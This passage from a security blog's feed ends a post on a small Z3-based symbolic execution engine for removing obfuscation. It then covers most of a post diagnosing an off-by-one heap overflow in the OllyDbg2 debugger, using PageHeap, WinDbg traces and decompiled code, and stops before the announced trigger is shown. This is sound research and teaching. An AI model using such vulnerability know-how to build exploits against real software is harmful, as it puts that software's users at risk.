</span><span class='line'>                    <span class="bp">self</span><span class="o">.</span><span class="n">set_reg_with_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_reg_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">)</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_reg_equation</span><span class="p">(</span><span class="n">src</span><span class="p">))</span>
</span><span class='line'>                <span class="c"># add reg32, cst</span>
</span><span class='line'>                <span class="k">elif</span> <span class="n">dst</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">ctx</span> <span class="ow">and</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="p">(</span><span class="nb">int</span><span class="p">,</span> <span class="nb">long</span><span class="p">)):</span>
</span><span class='line'>                    <span class="bp">self</span><span class="o">.</span><span class="n">set_reg_with_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_reg_equation</span><span class="p">(</span><span class="n">dst</span><span class="p">)</span> <span class="o">+</span> <span class="n">src</span><span class="p">)</span>
</span><span class='line'>                <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                    <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&#39;This encoding of &quot;add&quot; is not handled.&#39;</span><span class="p">)</span>
</span><span class='line'>            <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                <span class="k">print</span> <span class="n">mnemonic</span><span class="p">,</span> <span class="n">dst</span><span class="p">,</span> <span class="n">src</span>
</span><span class='line'>                <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&#39;This instruction is not handled.&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>            <span class="bp">self</span><span class="o">.</span><span class="n">ninstrs</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">_simplify_additions</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">eq</span><span class="p">):</span>
</span><span class='line'>        <span class="sd">&#39;&#39;&#39;The idea in this function is to help Z3 to simplify our big bitvec-arithmetic</span>
</span><span class='line'><span class="sd">        expression. It&#39;s simple, in eq we have a big expression with two symbolic variables (arg0 &amp; arg1)</span>
</span><span class='line'><span class="sd">        and a lot of bitvec arithmetic. Somehow, the simplify function is not clever enough to reduce the</span>
</span><span class='line'><span class="sd">        equation.</span>
</span><span class='line'>
</span><span class='line'><span class="sd">        The idea here is to use the prove function in order to see if we can simplify an equation by an addition of the</span>
</span><span class='line'><span class="sd">        symbolic variables.&#39;&#39;&#39;</span>
</span><span class='line'>        <span class="c"># The two expressions are equivalent ; we got a simplification!</span>
</span><span class='line'>        <span class="k">if</span> <span class="n">prove_</span><span class="p">(</span><span class="n">Sum</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">sym_variables</span><span class="p">)</span> <span class="o">==</span> <span class="n">eq</span><span class="p">):</span>
</span><span class='line'>            <span class="k">return</span> <span class="n">Sum</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">sym_variables</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">return</span> <span class="n">eq</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">get_reg_equation_simplified</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">reg</span><span class="p">):</span>
</span><span class='line'>        <span class="n">eq</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_reg_equation</span><span class="p">(</span><span class="n">reg</span><span class="p">)</span>
</span><span class='line'>        <span class="n">eq</span> <span class="o">=</span> <span class="n">simplify</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">_simplify_additions</span><span class="p">(</span><span class="n">eq</span><span class="p">))</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">eq</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span><span class='line'>    <span class="sd">&#39;&#39;&#39;Here we will try to attack the semantic-preserving obfuscations</span>
</span><span class='line'><span class="sd">    I talked about in &quot;Obfuscation of steel: meet my Kryptonite.&quot; : http://0vercl0k.tuxfamily.org/bl0g/?p=260.</span>
</span><span class='line'>
</span><span class='line'><span class="sd">    The idea is to defeat those obfuscations using a tiny symbolic execution engine.&#39;&#39;&#39;</span>
</span><span class='line'>    <span class="c"># sym = SymbolicExecutionEngine(0x804845A, 0x0804A17C) # for simple adder</span>
</span><span class='line'>    <span class="n">sym</span> <span class="o">=</span> <span class="n">SymbolicExecutionEngine</span><span class="p">(</span><span class="mh">0x804823C</span><span class="p">,</span> <span class="mh">0x08072284</span><span class="p">)</span> <span class="c"># adder kryptonized</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;Launching the engine..&#39;</span>
</span><span class='line'>    <span class="n">sym</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;Done. </span><span class="si">%d</span><span class="s"> equations built, </span><span class="si">%d</span><span class="s"> assembly lines emulated, </span><span class="si">%d</span><span class="s"> virtual memory cells used&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sym</span><span class="o">.</span><span class="n">equations</span><span class="p">),</span> <span class="n">sym</span><span class="o">.</span><span class="n">ninstrs</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">sym</span><span class="o">.</span><span class="n">mem</span><span class="p">))</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;CPU state at the end:&#39;</span>
</span><span class='line'>    <span class="k">print</span> <span class="n">sym</span><span class="o">.</span><span class="n">ctx</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;Retrieving and simplifying the EAX register..&#39;</span>
</span><span class='line'>    <span class="n">eax</span> <span class="o">=</span> <span class="n">sym</span><span class="o">.</span><span class="n">get_reg_equation_simplified</span><span class="p">(</span><span class="s">&#39;eax&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;EAX=</span><span class="si">%r</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">eax</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">1</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
</span><span class='line'>    <span class="n">main</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>And here is the final output:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>Launching the engine..
</span><span class='line'>Trying to read a non-initialized area, we got a new symbolic variable: arg0
</span><span class='line'>Trying to read a non-initialized area, we got a new symbolic variable: arg1
</span><span class='line'>5000 instructions, 2263 equations so far...
</span><span class='line'>10000 instructions, 4832 equations so far...
</span><span class='line'>15000 instructions, 7228 equations so far...
</span><span class='line'>20000 instructions, 9766 equations so far...
</span><span class='line'>25000 instructions, 12212 equations so far...
</span><span class='line'>30000 instructions, 14762 equations so far...
</span><span class='line'>35000 instructions, 17255 equations so far...
</span><span class='line'>40000 instructions, 19801 equations so far...
</span><span class='line'>Done. 19857 equations built, 40130 assembly lines emulated, 5970 virtual memory cells used
</span><span class='line'>CPU state at the end:
</span><span class='line'>{&#39;eax&#39;: EID:19856, &#39;ebp&#39;: None, &#39;eip&#39;: None, &#39;esp&#39;: None, &#39;edx&#39;: EID:19825, &#39;edi&#39;: EID:19796, &#39;ebx&#39;: EID:19797, &#39;esi&#39;: EID:19823, &#39;ecx&#39;: EID:19856}
</span><span class='line'>Retrieving and simplifying the EAX register..
</span><span class='line'>EAX=arg0 + arg1
</span></code></pre></td></tr></table></div></figure>


<h1>Conclusion</h1>

<p>I hope you did enjoy this little introduction to symbolic execution, and how it can be very valuable to remove some semantic-preserving obfuscations. We also have seen that this PoC is not really elaborate: it doesn&rsquo;t handle loops or any branches, doesn&rsquo;t care about EFLAGS, etc ; but it was enough to break our two examples. I hope you also enjoyed the examples used to showcase our tiny symbolic execution engine.</p>

<p>If you want to go further with symbolic execution, here is a list of nice articles:</p>

<ul>
<li><a href="http://seanhn.wordpress.com/2012/03/23/anatomy-of-a-symbolic-emulator-part-1-trace-generation/">Anatomy of a Symbolic Emulator, Part 1: Trace Generation</a></li>
<li><a href="http://seanhn.wordpress.com/2012/03/23/anatomy-of-a-symbolic-emulator-part-2-introducing-symbolic-data/">Anatomy of a Symbolic Emulator, Part 2: Introducing Symbolic Data</a></li>
<li><a href="http://seanhn.wordpress.com/2012/03/23/anatomy-of-a-symbolic-emulator-part-3-processing-symbolic-data-generating-new-inputs/">Anatomy of a Symbolic Emulator, Part 3: Processing Symbolic Data &amp; Generating New Inputs</a></li>
<li><a href="http://research.microsoft.com/en-us/um/people/pg/public_psfiles/fsttcs2012.pdf">Test Generation Using Symbolic Execution</a></li>
<li><a href="http://ccadar.github.io/klee/">The KLEE Symbolic Virtual Machine</a></li>
<li><a href="http://shell-storm.org/blog/Concolic-execution-taint-analysis-with-valgrind-and-constraints-path-solver-with-z3/">Concolic execution &ndash; Taint analysis with Valgrind and constraints path solver with Z3</a></li>
<li><a href="https://sites.google.com/site/symexbib/">A Bibliography of Papers on Symbolic Execution Technique and its Applications</a></li>
</ul>


<p>PS: By the way, for those who like weird machines, I&rsquo;ve managed to code a MOV/JMP turing machine based on <a href="http://www.cl.cam.ac.uk/~sd601/papers/mov.pdf">mov is Turing-complete</a> here: <a href="https://github.com/0vercl0k/stuffz/blob/master/fun_with_mov_turing_completeness.cpp">fun_with_mov_turing_completeness.cpp</a>!</p>
]]></content>
    
  </entry>
  
  <entry>
    
    <title type="html"><![CDATA[Pinpointing heap-related issues: OllyDbg2 off-by-one story]]></title>
    <link href="http://doar-e.github.io/blog/2013/09/09/pinpointing-heap-related-issues-ollydbg2-off-by-one-story/"/>
    
    <updated>2013-09-09T09:53:00-07:00</updated>
    <id>http://doar-e.github.io/blog/2013/09/09/pinpointing-heap-related-issues-ollydbg2-off-by-one-story</id>
    
    <content type="html"><![CDATA[<h1>Introduction</h1>

<p>Yesterday afternoon, I was peacefully coding some stuff you know but I couldn&rsquo;t make my code working.
As usual, in those type of situations you fire up your debugger in order to understand what is going on under the hood.
That was a bit weird, to give you a bit of context I was doing some inline x86 assembly, and I&rsquo;ve put on purpose an <em>int3</em> just
before the piece of assembly code I thought was buggy. Once my file loaded in <a href="http://ollydbg.de/version2.html">OllyDbg2</a>, I hit <em>F9</em> in order to reach quickly the <em>int3</em> I&rsquo;ve slipped into the inline assembly code. A bit of single-stepping, and <strong>BOOM</strong> I got a nasty crash. It happens sometimes, and that&rsquo;s uncool.
Then, I relaunch my binary and try to reproduce the bug: same actions and <strong>BOOM</strong> again. OK, this time it&rsquo;s cool, I got a reproducible crash in OllyDbg2.</p>

<p>I like when things like that happens to me (remember the crashes I&rsquo;ve found in OllyDbg/IDA here: <a href="http://download.tuxfamily.org/overclokblog/PDB%20ain%27t%20PDD/0vercl0k_pdb_aint_pdd.pdf">PDB Ain&rsquo;t PDD</a>), it&rsquo;s always a nice exercise for me where I&rsquo;ve to:</p>

<ul>
<li>pinpoint the bug in the application: usually not trivial when it&rsquo;s a real/big application</li>
<li>reverse-engineer the codes involved in the bug in order to figure out why it&rsquo;s happening (sometimes I got the sources, sometimes I don&rsquo;t like this time)</li>
</ul>


<p>In this post, I will show you how I&rsquo;ve manage to pinpoint where the bug was, using <a href="http://msdn.microsoft.com/en-us/library/windows/hardware/ff549561(v=vs.85).aspx">GFlags, PageHeap</a> and <a href="http://www.windbg.info/">WinDbg</a>. Then, we will reverse-engineer the buggy code in order to understand why the bug is happening, and how we can code a clean trigger.</p>

<div class='entry-content-toc'></div>




<!--more-->


<h1>The crash</h1>

<p>The first thing I did was to launch WinDbg to debug OllyDbg2 to debug my binary (yeah.). Once OllyDbg2 has been started up, I reproduced exactly the same steps as previously to trigger the bug and here is what WinDbg was telling me:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>HEAP[ollydbg.exe]: Heap block at 00987AB0 modified at 00987D88 past
</span><span class='line'>requested size of 2d0
</span><span class='line'>
</span><span class='line'>(a60.12ac): Break instruction exception - code 80000003 (first chance)
</span><span class='line'>eax=00987ab0 ebx=00987d88 ecx=76f30b42 edx=001898a5 esi=00987ab0 edi=000002d0
</span><span class='line'>eip=76f90574 esp=00189aec ebp=00189aec iopl=0         nv up ei pl nz na po nc
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
</span><span class='line'>ntdll!RtlpBreakPointHeap+0x23:
</span><span class='line'>76f90574 cc              int     3
</span></code></pre></td></tr></table></div></figure>


<p>We got a debug message from the heap allocator informing us the process has written outside of its heap buffer. The thing is, this message and the breakpoint are not triggered when the faulty write is done but triggered like <em>after</em>, when another call to the allocator has been made. At this moment, the allocator is checking the chunks are OK and if it sees something weird, it outputs a message and breaks. The stack-trace should confirm that:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt; k
</span><span class='line'>ChildEBP RetAddr
</span><span class='line'>00189aec 76f757c2 ntdll!RtlpBreakPointHeap+0x23
</span><span class='line'>00189b04 76f52a8a ntdll!RtlpCheckBusyBlockTail+0x171
</span><span class='line'>00189b24 76f915cf ntdll!RtlpValidateHeapEntry+0x116
</span><span class='line'>00189b6c 76f4ac29 ntdll!RtlDebugFreeHeap+0x9a
</span><span class='line'>00189c60 76ef34a2 ntdll!RtlpFreeHeap+0x5d
</span><span class='line'>00189c80 75d8537d ntdll!RtlFreeHeap+0x142
</span><span class='line'>00189cc8 00403cfc KERNELBASE!GlobalFree+0x27
</span><span class='line'>00189cd4 004cefc0 ollydbg!Memfree+0x3c
</span><span class='line'>...
</span></code></pre></td></tr></table></div></figure>


<p>As we said just above, the message from the heap allocator has been probably triggered when OllyDbg2 wanted to free a chunk of memory.</p>

<p>Basically, the problem with our issue is the fact we don&rsquo;t know:</p>

<ul>
<li>where the heap chunk has been allocated</li>
<li>where the faulty write has been made</li>
</ul>


<p>That&rsquo;s what makes our bug not trivial to debug without the suitable tools. If you want to have more information about debugging heap issues efficiently, you should definitely read the heap chapter in <a href="http://advancedwindowsdebugging.com/">Advanced Windows Debugging</a> (cheers <a href="https://twitter.com/Ivanlef0u">`Ivan</a>).</p>

<h1>Pinpointing the heap issue: introducing full PageHeap</h1>

<p>In a nutshell, the full PageHeap option is really powerful to diagnostic heap issues, here are at least two reasons why:</p>

<ul>
<li>it will save where each heap chunk has been allocated</li>
<li>it will allocate a guard page at the end of our chunk (thus when the faulty write occurs, we might have a write access exception)</li>
</ul>


<p>To do so, this option changes a bit how the allocator works (it adds more meta-data for each heap chunk, etc.) ; if you want more information, try at home allocating stuff with/without page heap and compare the allocated memory. Here is how looks like a heap chunk when PageHeap full is enabled:</p>

<p><img class="center" src="http://doar-e.github.io/images/pinpointing_heap_related_issues__ollydbg2_off_by_one_story/heapchunk.gif"></p>

<p>To enable it for <em>ollydbg.exe</em>, it&rsquo;s trivial. We just launch the <em>gflags.exe</em> binary (it&rsquo;s in Windbg&rsquo;s directory) and you tick the features you want to enable.</p>

<p><img class="center" src="http://doar-e.github.io/images/pinpointing_heap_related_issues__ollydbg2_off_by_one_story/gflags.png"></p>

<p>Now, you just have to relaunch your target in WinDbg, reproduce the bug and here is what I get now:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>(f48.1140): Access violation - code c0000005 (first chance)
</span><span class='line'>First chance exceptions are reported before any exception handling.
</span><span class='line'>This exception may be expected and handled.
</span><span class='line'>
</span><span class='line'>eax=000000b4 ebx=0f919abc ecx=0f00ed30 edx=00000b73 esi=00188694 edi=005d203c
</span><span class='line'>eip=004ce769 esp=00187d60 ebp=00187d80 iopl=0         nv up ei pl zr na pe nc
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
</span><span class='line'>ollydbg!Findfreehardbreakslot+0x21d9:
</span><span class='line'>004ce769 891481          mov     dword ptr [ecx+eax*4],edx ds:002b:0f00f000=????????
</span></code></pre></td></tr></table></div></figure>


<p>Woot, this is very cool, because now we know <strong>exactly</strong> where something is going wrong. Let&rsquo;s get more information about the heap chunk now:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt; !heap -p -a ecx
</span><span class='line'>    address 0f00ed30 found in
</span><span class='line'>    _DPH_HEAP_ROOT @ 4f11000
</span><span class='line'>    in busy allocation
</span><span class='line'>    (  DPH_HEAP_BLOCK:  UserAddr  UserSize -  VirtAddr VirtSize)
</span><span class='line'>              f6f1b2c:  f00ed30        2d0 -  f00e000  2000
</span><span class='line'>
</span><span class='line'>    6e858e89 verifier!AVrfDebugPageHeapAllocate+0x00000229
</span><span class='line'>    76f90d96 ntdll!RtlDebugAllocateHeap+0x00000030
</span><span class='line'>    76f4af0d ntdll!RtlpAllocateHeap+0x000000c4
</span><span class='line'>    76ef3cfe ntdll!RtlAllocateHeap+0x0000023a
</span><span class='line'>    75d84e55 KERNELBASE!GlobalAlloc+0x0000006e
</span><span class='line'>    00403bef ollydbg!Memalloc+0x00000033
</span><span class='line'>    004ce5ec ollydbg!Findfreehardbreakslot+0x0000205c
</span><span class='line'>    004cf1df ollydbg!Getsourceline+0x0000007f
</span><span class='line'>    00479e1b ollydbg!Getactivetab+0x0000241b
</span><span class='line'>    0047b341 ollydbg!Setcpu+0x000006e1
</span><span class='line'>    004570f4 ollydbg!Checkfordebugevent+0x00003f38
</span><span class='line'>    0040fc51 ollydbg!Setstatus+0x00006441
</span><span class='line'>    004ef9ef ollydbg!Pluginshowoptions+0x0001214f
</span></code></pre></td></tr></table></div></figure>


<p>With this really handy command we got a lot of relevant information:</p>

<ul>
<li>This chunk has a size of 0x2d0 bytes. Thus, starting from 0xf00ed30 to 0xf00efff.</li>
<li>The faulty write now makes sense: the application tries to write 4 bytes outside of its heap buffer (off-by-one on an unsigned array I guess).</li>
<li>The memory has been allocated in <em>ollydbg!Memalloc</em> (called by <em>ollydbg!Getsourceline</em>, PDB related ?). We will study that routine later in the post.</li>
<li>The faulty write occurs at address 0x4ce769.</li>
</ul>


<h1>Looking inside OllyDbg2</h1>

<p>We are kind of lucky, the routines involved with this bug are quite simple to reverse-engineer, and Hexrays works just like a charm. Here is the C code (the interesting part at least) of the buggy function:</p>

<figure class='code'><figcaption><span>ollydbg!buggy @ 0x004CE424</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">signed</span> <span class="kt">int</span> <span class="nf">buggy</span><span class="p">(</span><span class="n">struct_a1</span> <span class="o">*</span><span class="n">u</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">file_size</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">nbchar</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="o">*</span><span class="n">file_content</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">nb_lines</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">idx</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1">// ...</span>
</span><span class='line'>  <span class="n">file_content</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="o">*</span><span class="p">)</span><span class="n">Readfile</span><span class="p">(</span><span class="o">&amp;</span><span class="n">u</span><span class="o">-&gt;</span><span class="n">sourcefile</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">file_size</span><span class="p">);</span>
</span><span class='line'>  <span class="c1">// ...</span>
</span><span class='line'>  <span class="n">nbchar</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="n">nb_lines</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="k">while</span><span class="p">(</span><span class="n">nbchar</span> <span class="o">&lt;</span> <span class="n">file_size</span><span class="p">)</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="c1">// doing stuff to count all the char, and all the lines in the file</span>
</span><span class='line'>    <span class="c1">// ...</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">u</span><span class="o">-&gt;</span><span class="n">mem1_ov</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">Memalloc</span><span class="p">(</span><span class="mi">12</span> <span class="o">*</span> <span class="p">(</span><span class="n">nb_lines</span> <span class="o">+</span> <span class="mi">1</span><span class="p">),</span> <span class="mi">3</span><span class="p">);</span>
</span><span class='line'>  <span class="n">u</span><span class="o">-&gt;</span><span class="n">mem2</span> <span class="o">=</span> <span class="n">Memalloc</span><span class="p">(</span><span class="mi">8</span> <span class="o">*</span> <span class="p">(</span><span class="n">nb_lines</span> <span class="o">+</span> <span class="mi">1</span><span class="p">),</span> <span class="mi">3</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span> <span class="n">u</span><span class="o">-&gt;</span><span class="n">mem1_ov</span> <span class="o">&amp;&amp;</span> <span class="n">u</span><span class="o">-&gt;</span><span class="n">mem2</span> <span class="p">)</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="n">nbchar</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="n">nb_lines2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="k">while</span> <span class="p">(</span> <span class="n">nbchar</span> <span class="o">&lt;</span> <span class="n">file_size</span> <span class="o">&amp;&amp;</span> <span class="n">file_content</span><span class="p">[</span><span class="n">nbchar</span><span class="p">]</span> <span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>      <span class="n">u</span><span class="o">-&gt;</span><span class="n">mem1_ov</span><span class="p">[</span><span class="mi">3</span> <span class="o">*</span> <span class="n">nb_lines2</span><span class="p">]</span> <span class="o">=</span> <span class="n">nbchar</span><span class="p">;</span>
</span><span class='line'>      <span class="n">u</span><span class="o">-&gt;</span><span class="n">mem1_ov</span><span class="p">[</span><span class="mi">3</span> <span class="o">*</span> <span class="n">nb_lines2</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span> <span class="n">nbchar</span> <span class="o">&lt;</span> <span class="n">file_size</span> <span class="p">)</span>
</span><span class='line'>      <span class="p">{</span>
</span><span class='line'>        <span class="k">while</span> <span class="p">(</span> <span class="n">file_content</span><span class="p">[</span><span class="n">nbchar</span><span class="p">]</span> <span class="p">)</span>
</span><span class='line'>        <span class="p">{</span>
</span><span class='line'>            <span class="c1">// Consume a line, increment stuff until finding a &#39;\r&#39; or &#39;\n&#39; sequence</span>
</span><span class='line'>            <span class="c1">// ..</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>      <span class="o">++</span><span class="n">nb_lines2</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="c1">// BOOM!</span>
</span><span class='line'>    <span class="n">u</span><span class="o">-&gt;</span><span class="n">mem1_ov</span><span class="p">[</span><span class="mi">3</span> <span class="o">*</span> <span class="n">nb_lines2</span><span class="p">]</span> <span class="o">=</span> <span class="n">nbchar</span><span class="p">;</span>
</span><span class='line'>    <span class="c1">// ...</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>So, let me explain what this routine does:</p>

<ul>
<li>This routine is called by OllyDbg2 when it finds a PDB database for your binary and, more precisely, when in this database it finds the path of your application&rsquo;s source codes. It&rsquo;s useful to have those kind of information when you are debugging, OllyDbg2 is able to tell you at which line of your C code you&rsquo;re currently at.</li>
</ul>


<p><img class="center" src="http://doar-e.github.io/images/pinpointing_heap_related_issues__ollydbg2_off_by_one_story/source.png"></p>

<ul>
<li>At line 10: &ldquo;u->Sourcefile&rdquo; is a string pointer on the path of your source code (found in the PDB database). The routine is just reading the whole file, giving you its size, and a pointer on the file content now stored memory.</li>
<li>From line 12 to 18: we have a loop counting the total number of lines in your source code.</li>
<li>At line 20: we have the allocation of our chunk. It allocates 12*(nb_lines + 1) bytes. We saw previously in WinDbg that the size of the chunk was 0x2d0: it should means we have exactly ((0x2d0 / 12) &ndash; 1) = 59 lines in our source code:</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>D:\TODO\crashes\odb2-OOB-write-heap&gt;wc -l OOB-write-heap-OllyDbg2h-trigger.c
</span><span class='line'>59 OOB-write-heap-OllyDbg2h-trigger.c
</span></code></pre></td></tr></table></div></figure>


<p>Good.</p>

<ul>
<li>From line 24 to 39: we have a loop similar to previous one. It&rsquo;s basically counting lines again and initializing the memory we just allocated with some information.</li>
<li>At line 41: we have our bug. Somehow, we can manage to get out of the loop with &ldquo;nb_lines2 = nb_lines + 1&rdquo;. That means the line 41 will try to write one cell outside of our buffer. In our case, if we have &ldquo;nb_lines2 = 60&rdquo; and our heap buffer starting at 0xf00ed30, it means we&rsquo;re going to try to write at (0xf00ed30+60<em>3</em>4)=0xf00f000. That&rsquo;s exactly what we saw earlier.</li>
</ul>


<p>At this point, we have fully explained the bug. If you want to do some dynamic analysis in order to follow important routines, I&rsquo;ve made several breakpoints, here they are:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
